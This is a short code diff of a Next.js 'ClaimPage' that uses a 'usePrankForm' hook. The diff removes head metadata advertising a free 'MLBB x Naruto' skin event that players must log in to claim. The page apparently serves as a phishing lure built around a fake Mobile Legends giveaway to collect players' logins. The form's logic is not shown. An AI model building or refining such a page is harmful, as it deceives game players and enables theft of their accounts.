@@ -1,6 +1,5 @@
 'use client'; // This directive makes it a Client Component
 
-import Head from 'next/head'; // Still useful for setting page title
 import Image from 'next/image'; // Let's use this for some flair!
 import { usePrankForm } from '@/app/hooks/usePrankForm'; // Assuming alias for hooks
 import { PrankFormComponent } from '@/app/components/PrankForm'; // Assuming alias for components
@@ -19,14 +18,6 @@ export default function ClaimPage() {
 
   return (
     <>
-      <Head>
-        <title>🔥 MLBB x Naruto: EPIC SKIN EVENT! Claim Yours NOW! 🔥</title>
-        <meta
-          name="description"
-          content="Don't miss out! Log in to claim your FREE & EXCLUSIVE Naruto Series Skins for Mobile Legends - Limited Time Only!"
-        />
-        <link rel="icon" href="/mole.svg" />
-      </Head>
       {/* Main container with a more dynamic gradient background */}
       <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-orange-700 flex flex-col items-center justify-center p-4 text-white selection:bg-orange-500 selection:text-white">
         {/* Event Card */}
